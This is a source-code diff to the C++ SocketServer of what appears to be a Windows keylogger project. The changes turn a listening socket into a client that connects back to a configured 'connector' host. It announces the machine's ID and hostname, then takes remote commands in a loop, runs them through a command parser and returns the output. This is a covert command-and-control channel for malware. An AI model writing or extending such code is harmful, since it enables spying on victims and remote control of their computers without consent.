@@ -5,114 +5,127 @@
 #include "helpers/ComputerInfoHelper.h"
 #include "services/CommandParser.h"
 #include "helpers/StringHelper.h"
+#include "helpers/Configuration.h"
+#include "helpers/AppData.h"
 
-SocketServer::SocketServer(Keylogger* logger) {
-    listenSocket = INVALID_SOCKET;
+SocketServer::SocketServer() { }
 
-    std::wcout << L"socket";
-    WSADATA wsaData;
-    int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
-    if (result != 0) {
-        std::cerr << "WSAStartup failed: " << result << "\n";
-    }
-
-    struct addrinfo* addr = nullptr;
-    struct addrinfo hints;
-    ZeroMemory(&hints, sizeof(hints));
-
-    hints.ai_family = AF_INET;
-    hints.ai_socktype = SOCK_STREAM;
-    hints.ai_protocol = IPPROTO_TCP;
-
-    hints.ai_flags = AI_PASSIVE;
-
-    std::wcout << ComputerInfoHelper::getInstance()->getHostName() << L" " <<
-        ComputerInfoHelper::getInstance()->getIp() << std::endl;
-
-    result = getaddrinfo(StringHelper::ws2s(ComputerInfoHelper::getInstance()->getIp()).c_str(),
-        StringHelper::ws2s(ComputerInfoHelper::getInstance()->getPort()).c_str(), &hints, &addr);
-
-    if (result != 0) {
-        std::cerr << "getaddrinfo failed: " << result << "\n";
-        WSACleanup();
-    }
-
-    this->listenSocket = socket(addr->ai_family, addr->ai_socktype,
-        addr->ai_protocol);
-
-    if (this->listenSocket == INVALID_SOCKET) {
-        std::cerr << "Error at socket: " << WSAGetLastError() << "\n";
-        freeaddrinfo(addr);
-        WSACleanup();
-    }
-
-    int bindResult = ::bind(this->listenSocket, addr->ai_addr, (int)addr->ai_addrlen);
-
-    if (listen(this->listenSocket, SOMAXCONN) == SOCKET_ERROR) {
-        std::cerr << "listen failed with error: " << WSAGetLastError() << "\n";
-        closesocket(this->listenSocket);
-        this->listenSocket = INVALID_SOCKET;
-        WSACleanup();
-    }
+SocketServer::~SocketServer() {
+	close(this->serverSocket);
 }
 
 void SocketServer::start() {
-    if (this->listenSocket == INVALID_SOCKET) {
-        std::cerr << "socket is not active" << std::endl;
-        return;
-    } else {
-        std::wcout << "socket active" << std::endl;
-    }
+	WSADATA wsaData;
+	int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
+	if (result != 0) {
+		std::cerr << "WSAStartup failed: " << result << "\n";
+		return;
+	}
 
-    wchar_t requestBuffer[SOCKET_BUFFER_SIZE];
-    int clientSocket = INVALID_SOCKET;
+	struct addrinfo* addr = nullptr;
+	struct addrinfo hints;
+	ZeroMemory(&hints, sizeof(hints));
 
-    while (true) {
-        clientSocket = accept(this->listenSocket, NULL, NULL);
-        std::wcout << L"accepted client: " << clientSocket << std::endl;
+	hints.ai_family = AF_INET;
+	hints.ai_socktype = SOCK_STREAM;
+	hints.ai_protocol = IPPROTO_TCP;
 
-        if (clientSocket == INVALID_SOCKET) {
-            std::cerr << "accept failed: " << WSAGetLastError() << std::endl;
-            closesocket(this->listenSocket);
-            WSACleanup();
-            continue;
-        }
+	hints.ai_flags = AI_PASSIVE;
 
-        while (true) {
-            int receivedSize = recv(clientSocket, (char*)requestBuffer, sizeof(wchar_t) * SOCKET_BUFFER_SIZE, 0);
+	auto connectorAddress = StringHelper::ws2s(Configuration::ConnectorAddress);
+	auto connectorPort = StringHelper::ws2s(Configuration::ConnectorPort);
+	result = getaddrinfo(connectorAddress.c_str(), connectorPort.c_str(), &hints, &addr);
 
+	if (result != 0) {
+		std::cerr << "Can't find this address. Error code: " << result << "\n";
+		WSACleanup();
+		return;
+	}
 
-            std::wstring response;
+	// Connect to connector socket
 
-            if (receivedSize == SOCKET_ERROR) {
-                std::cerr << "recv failed: " << receivedSize << std::endl;
-                break;
-            } else if (receivedSize == 0) {
-                std::cerr << "connection closed..." << std::endl;
-            } else if (receivedSize > 0) {
-                requestBuffer[receivedSize / 2] = '\0';
-                std::wstring request = std::wstring(requestBuffer);
-                std::wcout << L"received: " << request << std::endl;
+	serverSocket = socket(addr->ai_family, addr->ai_socktype,
+		addr->ai_protocol);
 
-                response = this->getResponse(request);
+	if (serverSocket == INVALID_SOCKET) {
+		std::cerr << "Error at socket: " << WSAGetLastError() << "\n";
+		freeaddrinfo(addr);
+		WSACleanup();
+		return;
+	}
 
-                int sendResult = send(clientSocket, (char*)response.c_str(),
-                    sizeof(wchar_t) * response.size(), 0);
+	int connectResult = connect(serverSocket, addr->ai_addr, (int)addr->ai_addrlen);
+	if (connectResult == SOCKET_ERROR) {
+		std::cerr << "Can't find socket on this address. Error code: " << WSAGetLastError() << "\n";
+		serverSocket = INVALID_SOCKET;
+		WSACleanup();
+		return;
+	}
 
-                if (request.compare(L"exit") == 0) {
-                    break;
-                }
+	if (serverSocket == INVALID_SOCKET) {
+		std::cerr << "Error at socket: " << WSAGetLastError() << "\n";
+		WSACleanup();
+		return;
+	}
 
-                if (sendResult == SOCKET_ERROR) {
-                    std::cerr << "send failed: " << WSAGetLastError() << std::endl;
-                }
-            }
-        }
+	int requestResult;
+	std::string request;
+	wchar_t responseBuffer[SOCKET_BUFFER_SIZE];
+	std::wstring response;
+	int receivedSize;
 
-        closesocket(clientSocket);
-    }
+	// Send welcome message for connector
+
+	auto message = AppData::getInstance().ComputerId + L" " + ComputerInfoHelper::getInstance()->getHostName();
+	request = StringHelper::ws2s(message);
+
+	requestResult = send(serverSocket, request.c_str(), request.size(), 0);
+	if (requestResult == SOCKET_ERROR) {
+		std::wcout << L"Error connecting to server";
+	}
+
+	receivedSize = recv(serverSocket, (char*)responseBuffer, sizeof(wchar_t) * SOCKET_BUFFER_SIZE, 0);
+
+	if (receivedSize == SOCKET_ERROR) {
+		std::cerr << "recv failed: " << receivedSize << std::endl;
+	} else if (receivedSize == 0) {
+		std::cerr << "connection closed..." << std::endl;
+	} else if (receivedSize > 0) {
+		responseBuffer[receivedSize / 2] = '\0';
+		response = std::wstring(responseBuffer);
+		std::wcout << L"received: " << response << std::endl;
+
+		if (response != L"ok") {
+			std::cerr << "Server haven't confirm connection";
+		}
+	}
+
+	// Listen for messages from connector
+	while (true) {
+		receivedSize = recv(serverSocket, (char*)responseBuffer, sizeof(wchar_t) * SOCKET_BUFFER_SIZE, 0);
+
+		if (receivedSize == SOCKET_ERROR) {
+			std::cerr << "recv failed: " << receivedSize << std::endl;
+			break;
+		} else if (receivedSize == 0) {
+			std::cerr << "connection closed..." << std::endl;
+		} else if (receivedSize > 0) {
+			responseBuffer[receivedSize / 2] = '\0';
+			response = std::wstring(responseBuffer);
+			std::wcout << L"received: " << response << std::endl;
+
+			auto responseResult = this->getResponse(response);
+
+			int sendResult = send(serverSocket, (char*)responseResult.c_str(),
+				sizeof(wchar_t) * responseResult.size(), 0);
+
+			if (sendResult == SOCKET_ERROR) {
+				std::cerr << "send failed: " << WSAGetLastError() << std::endl;
+			}
+		}
+	}
 }
 
 std::wstring SocketServer::getResponse(std::wstring request) {
-    return CommandParser::act(request);
+	return CommandParser::act(request);
 }
